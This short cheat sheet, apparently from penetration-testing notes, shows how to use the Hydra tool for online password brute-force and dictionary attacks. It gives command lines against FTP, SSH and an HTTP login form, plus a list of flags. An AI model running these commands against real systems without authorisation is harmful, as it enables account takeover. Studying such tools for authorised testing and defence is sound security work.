
# Hydra – Online Password Cracking

Hydra is used for online brute-force and dictionary attacks.

## Basic Syntax
hydra -l <username> -P <password_list> <target> <service>

## Examples

### FTP Brute Force
hydra -l admin -P passwords.txt 192.168.1.10 ftp

### SSH Brute Force
hydra -l root -P rockyou.txt 192.168.1.10 ssh

### HTTP POST Login
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Failed=Invalid"

## Useful Flags
-l  → single username  
-L  → username list  
-p  → single password  
-P  → password list  
-t  → threads  
-vV → verbose output
